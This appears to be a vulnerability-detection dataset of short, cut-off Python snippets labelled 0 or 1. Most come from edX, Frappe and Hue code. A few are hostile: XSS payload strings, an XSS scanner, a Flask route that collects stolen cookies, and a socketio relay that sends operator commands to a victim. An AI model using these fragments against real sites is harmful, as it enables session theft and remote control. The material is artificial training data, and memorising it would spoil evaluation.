settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns", "label": 0}, {"snippet_id": 8599, "code": "[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\")", "label": 0}, {"snippet_id": 26853, "code": ":/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0", "label": 0}, {"snippet_id": 53177, "code": "=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid()", "label": 0}, {"snippet_id": 42333, "code": "=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor", "label": 0}, {"snippet_id": 46227, "code": "({ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) }), 'is_owner': True, 'is_embeddable': request.GET.get('is_embeddable', False), ", "label": 0}, {"snippet_id": 48301, "code": "=GroupReservation.objects.get(id=str(request.GET[\"rid\"])) if current_reservation.createdByUser !=u and u.rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") if current_reservation.submitted==True: return", "label": 0}, {"snippet_id": 20282, "code": " True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests", "label": 0}, {"snippet_id": 1668, "code": "\": all_data={'url': data['url'], 'impact': data['impact'], 'name': data['name'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data['res_body", "label": 0}, {"snippet_id": 40599, "code": "=currency) \tdef is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller", "label": 0}, {"snippet_id": 13971, "code": "<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 44104, "code": ".django_db @pytest.mark.search class TestXSS: def test_facted_page_xss(self, client, project): query='XSS' page_search=PageDocument.faceted_search(query=query, user='') results=page_search.execute() expected=\"\"", "label": 0}, {"snippet_id": 45992, "code": "-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":[\"temp\"],\"klass\":\"card card-home card-column span10\"}, ", "label": 0}, {"snippet_id": 39630, "code": "[] \t\tfor df in self.meta.get(\"fields\",{\"reqd\":('=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df)", "label": 0}, {"snippet_id": 8617, "code": " 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name=", "label": 0}, {"snippet_id": 38296, "code": ".escape(txt))) \tif conditions: \t\tfrappe.local.no_cache=1 \tquery=\"\"\"\\ \t\tselect \t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on, \t\t\t\tt1.published_on as creation, \t\t\t\tt1.content as content, \t", "label": 0}, {"snippet_id": 52098, "code": " **wid) workflow=Workflow(document=doc) else: doc=None workflow=Workflow() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) workflow_data=workflow.get_data() api=get_oozie", "label": 0}, {"snippet_id": 30687, "code": " form.getvalue('servaction') is not None: \tserver_state_file=sql.get_setting('server_state_file') \thaproxy_sock=sql.get_setting('haproxy_sock') \tenable=form.getvalue('servaction') \tbackend=form.getvalue", "label": 0}, {"snippet_id": 35816, "code": "'Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values", "label": 0}, {"snippet_id": 50369, "code": " request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) sess=self.sessionhandler.sessions_from_csessid(csessid) if sess: sess=sess[0]", "label": 0}, {"snippet_id": 20955, "code": " 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release", "label": 0}, {"snippet_id": 35094, "code": "=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as e: \t\t\tif e.args[0]==1062 and \"Duplicate\" in cstr(e.args[1]): \t\t\t\tself.show_unique_validation_message(e) \t\t\telse: \t\t\t\traise", "label": 0}, {"snippet_id": 44374, "code": ".dumps(doc is None or doc.doc.get().is_editable(request.user)) }) def new_workflow(request): return edit_workflow(request) def delete_workflow(request): if request.method !='POST': raise PopupException(_('A", "label": 0}, {"snippet_id": 51399, "code": ".1/topics/settings/ For the full list of settings and their values, see https://docs.djangoproject.com/en/2.1/ref/settings/ \"\"\" import os from datetime import timedelta from django.utils.translation import", "label": 0}, {"snippet_id": 37934, "code": ",)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname", "label": 0}, {"snippet_id": 30537, "code": "') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1') \tdate=hour+':'+minut \tdate1=hour1+':'+minut1 \tapache_log_path=sql.get_setting('apache_log_path') \t \tif grep is not None: \t\tgrep_act ='|grep", "label": 0}, {"snippet_id": 41575, "code": " set_new_name from frappe.model.utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map", "label": 0}, {"snippet_id": 54506, "code": ", render, render_to_response from django.views.generic import ListView, DetailView from django.views.generic.edit import FormView, CreateView, DeleteView, UpdateView, FormMixin from markdown import markdown", "label": 0}, {"snippet_id": 29923, "code": ".getvalue('ssh_cert'): \tname=form.getvalue('name') \t \tif not os.path.exists(os.getcwd()+'/keys/'): \t\tos.makedirs(os.getcwd()+'/keys/') \t \tssh_keys=os.path.dirname(os.getcwd())+'/keys/'+name+'.pem' \t \ttry", "label": 0}, {"snippet_id": 42373, "code": ".as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options \tdef get_parentfield_of_doctype(self, doctype): \t\tfieldname=[df.fieldname for df in self.meta.get_table_fields", "label": 0}, {"snippet_id": 2947, "code": " XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross", "label": 0}, {"snippet_id": 12248, "code": "/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/", "label": 1}, {"snippet_id": 38569, "code": " issubclass(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype]", "label": 0}, {"snippet_id": 8535, "code": ".views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track", "label": 0}, {"snippet_id": 39889, "code": " \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn", "label": 0}, {"snippet_id": 5357, "code": "'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track', 'tt', 'u',", "label": 0}, {"snippet_id": 27427, "code": ".format(t=dt) def splitlines(text): \"\"\"Split text into lines.\"\"\" return text.splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump", "label": 0}, {"snippet_id": 51450, "code": "', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'django.contrib.humanize', 'django_celery_beat', 'compressor", "label": 0}, {"snippet_id": 42273, "code": " import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn frappe.local.valid_columns[self", "label": 0}, {"snippet_id": 2988, "code": "='': vul_param +=key else: vul_param +=','+key except: logs.logging.info(\"XSS: No GET param found!\") if vul_param: print vul_param,scanid dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\":", "label": 0}, {"snippet_id": 34905, "code": "): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname", "label": 0}, {"snippet_id": 16866, "code": "/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/", "label": 0}, {"snippet_id": 8158, "code": "'ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin'", "label": 0}, {"snippet_id": 42232, "code": "\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__", "label": 0}, {"snippet_id": 531, "code": " payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list", "label": 1}, {"snippet_id": 52317, "code": " len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status': -1}", "label": 0}, {"snippet_id": 23460, "code": "'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid", "label": 0}, {"snippet_id": 2521, "code": " temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload", "label": 0}, {"snippet_id": 26022, "code": ", } labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self", "label": 0}, {"snippet_id": 45173, "code": " d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not filter(lambda a: a['uuid']==coordinator.data['properties']['workflow'", "label": 0}, {"snippet_id": 22258, "code": ".views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),", "label": 0}, {"snippet_id": 8091, "code": "<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses", "label": 0}, {"snippet_id": 13721, "code": "+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/", "label": 1}, {"snippet_id": 31804, "code": "+' list. %s </div>' % e) \t\t if form.getvalue('bwlists_save'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue", "label": 0}, {"snippet_id": 15425, "code": ".prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo')", "label": 0}, {"snippet_id": 6697, "code": ": \"\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string) for use in simple templating", "label": 0}, {"snippet_id": 29471, "code": "%s\" % sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse", "label": 0}, {"snippet_id": 9371, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading", "label": 0}, {"snippet_id": 42588, "code": "\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t \t\traise frappe.UniqueValidationError", "label": 0}, {"snippet_id": 15490, "code": ".py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We", "label": 0}, {"snippet_id": 21123, "code": "', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+", "label": 0}, {"snippet_id": 33912, "code": "\tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape", "label": 0}, {"snippet_id": 53148, "code": ".loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps(response), mimetype=", "label": 0}, {"snippet_id": 21943, "code": "-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name", "label": 0}, {"snippet_id": 13549, "code": ", url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 14196, "code": "+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 12591, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes", "label": 0}, {"snippet_id": 37917, "code": "=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t", "label": 0}, {"snippet_id": 24209, "code": "-O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self", "label": 0}, {"snippet_id": 9003, "code": "/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$", "label": 0}, {"snippet_id": 45267, "code": ".objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc", "label": 0}, {"snippet_id": 19473, "code": ", procs=process_count ) ) suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes", "label": 0}, {"snippet_id": 22920, "code": "/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter", "label": 0}, {"snippet_id": 10490, "code": "' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls), report_dir=report_dir, ) return expected_statement def test_default", "label": 0}, {"snippet_id": 36160, "code": "[fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype \t\t\tdf=frappe.get_meta(doctype).get_field(fieldname) \t\t\tif df.fieldtype in(\"Currency\", \"Float\", \"Percent", "label": 0}, {"snippet_id": 11479, "code": " django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE", "label": 0}, {"snippet_id": 6168, "code": " self.config.read([filename]): raise ValueError(\"Failed loading config file{!r}\".format(filename)) @property def num_threads(self): \"\"\" Number of worker threads to start(integer). EduID IdP spawns multiple", "label": 0}, {"snippet_id": 47312, "code": ".status_code==200 res=client.get(detail_view_url) assert res.status_code==200 assert '<pre>null</pre>' in res.get_data(as_text=True) res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True)", "label": 0}, {"snippet_id": 44962, "code": " if params_form.is_valid(): mapping=dict([(param['name'], param['value']) for param in params_form.cleaned_data]) job_id=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request", "label": 0}, {"snippet_id": 19289, "code": "=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self", "label": 0}, {"snippet_id": 6114, "code": " configuration. Loads configuration from an INI-file at instantiation. :param filename: string, INI-file name :param debug: boolean, default debug value :raise ValueError: if INI-file can't be parsed \"", "label": 0}, {"snippet_id": 3492, "code": " def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query", "label": 0}, {"snippet_id": 23130, "code": "'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"),", "label": 0}, {"snippet_id": 16283, "code": "\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX", "label": 0}, {"snippet_id": 53989, "code": "']) def steal(): \tif request.method==\"GET\" or request.method==\"POST\": \t\tdata=request.values \t\tcookie=data.get('cookie') \t\twith open('cookies.txt',mode='a') as f: \t\t\tf.write('\\n-------------------------", "label": 0}, {"snippet_id": 15084, "code": " suite=Pa11yCrawler('') suite.get_test_course() self._mock_sh.assert_has_calls([ call( 'wget{targz} -O{dir}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir", "label": 0}, {"snippet_id": 49831, "code": " ''' @app.route('/',methods=['GET']) def shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if command", "label": 0}, {"snippet_id": 23661, "code": ".test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase", "label": 0}, {"snippet_id": 4453, "code": "\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', 's': '\\u0455', 'w': '\\u051D', 'x': '\\u0445', 'y': '\\u0443', } def __init__", "label": 0}, {"snippet_id": 46529, "code": "=collection.doc.get().can_write(request.user) collections.append(massaged_collection) return JsonResponse(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m", "label": 0}, {"snippet_id": 41548, "code": " six import iteritems, string_types import datetime import frappe, sys from frappe import _ from frappe.utils import(cint, flt, now, cstr, strip_html, \tsanitize_html, sanitize_email, cast_fieldtype) from", "label": 0}, {"snippet_id": 45581, "code": "'editor/bundle_editor.mako', request,{ 'bundle_json': bundle.json, 'coordinators_json': json.dumps(coordinators), 'doc1_id': doc.doc.get().id if doc else -1, 'can_edit_json': json.dumps(doc is None or doc", "label": 1}, {"snippet_id": 17103, "code": " name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses", "label": 0}, {"snippet_id": 5545, "code": "=alert(/xss/)>', \"\"\"<img src=\"javascript:alert('xss');\">\"\"\", \"\"\"<style>@im\\\\port'\\\\ja\\\\vasc\\\\ript:alert(\"xss\")';</style>\"\"\", \"\"\"<img style=\"xss:expr/*xss*/ession(alert('xss'))\"> \"\"\", \"\"\"<meta http-equiv", "label": 0}, {"snippet_id": 29358, "code": " mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg", "label": 0}, {"snippet_id": 4152, "code": " xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query", "label": 0}, {"snippet_id": 5960, "code": ", find_packages import sys, os from distutils import versionpredicate here=os.path.abspath(os.path.dirname(__file__)) README=open(os.path.join(here, 'README')).read() version='0.3.22' install_requires=", "label": 1}, {"snippet_id": 18520, "code": "/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$", "label": 0}, {"snippet_id": 46096, "code": " in request.GET: query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), ", "label": 1}, {"snippet_id": 42863, "code": " first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t", "label": 0}, {"snippet_id": 14177, "code": "[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 27381, "code": " dict_obj['id']=obj.key.id() return dict_obj elif isinstance(obj, datetime.datetime): return int((obj -self._EPOCH).total_seconds()) elif hasattr(obj, 'to_dict'): return obj.to_dict() elif isinstance(obj,", "label": 0}, {"snippet_id": 29462, "code": "\t def check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command", "label": 0}, {"snippet_id": 51079, "code": "=MyPeriodicTaskForm save_as=True @staticmethod def name_safe(obj): return mark_safe(obj.name) @staticmethod def last_run(obj): return obj.last_run_at @staticmethod def runs(obj): return obj.total_run_count", "label": 0}, {"snippet_id": 17178, "code": "')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 11582, "code": "?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"", "label": 0}, {"snippet_id": 3359, "code": "\"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads", "label": 0}, {"snippet_id": 5334, "code": "', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small',", "label": 0}, {"snippet_id": 15622, "code": " courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}", "label": 0}, {"snippet_id": 47518, "code": " button_text=str(profile.authuser.email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f", "label": 0}, {"snippet_id": 14854, "code": "{repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes=1) self.assertEqual", "label": 0}, {"snippet_id": 46353, "code": "'is_embeddable', False), 'can_edit_index': can_edit_index(request.user), 'mobile': is_mobile }) def browse_m(request, name): return browse(request, name, True) @allow_owner_only def save(request): response={'status", "label": 0}, {"snippet_id": 53656, "code": " coord_dir=Submission(request.user, coordinator, request.fs, request.jt, properties).deploy() deployment_mapping['coord_%s_dir' % i]=coord_dir deployment_mapping['coord_%s' % i]=coord properties.update", "label": 0}, {"snippet_id": 34500, "code": ": \t\t\t \t\t\t \t\t\tif(getattr(self, '_metaclass', None) \t\t\t\tor self.__class__.__name__ in('Meta', 'FormMeta', 'DocField')): \t\t\t\treturn value \t\t\traise ValueError( \t\t\t\t'Document for field \"{0}\" attached to child", "label": 0}, {"snippet_id": 37007, "code": ") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None): \tconditions=[] \tif filters: \t\tif filters.blogger: \t\t\tconditions.append('t1.blogger=\"%s", "label": 0}, {"snippet_id": 12627, "code": " urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(", "label": 0}, {"snippet_id": 32750, "code": "', '&lt;').replace( '>', '&gt;').replace( '\"', '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line\">' '<td class=\"u-lineNum", "label": 0}, {"snippet_id": 36128, "code": ".parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict()", "label": 0}, {"snippet_id": 30285, "code": "\t} \tq=requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt", "label": 0}, {"snippet_id": 22504, "code": ")$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$", "label": 0}, {"snippet_id": 6304, "code": "'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section, 'listen_addr') @property def 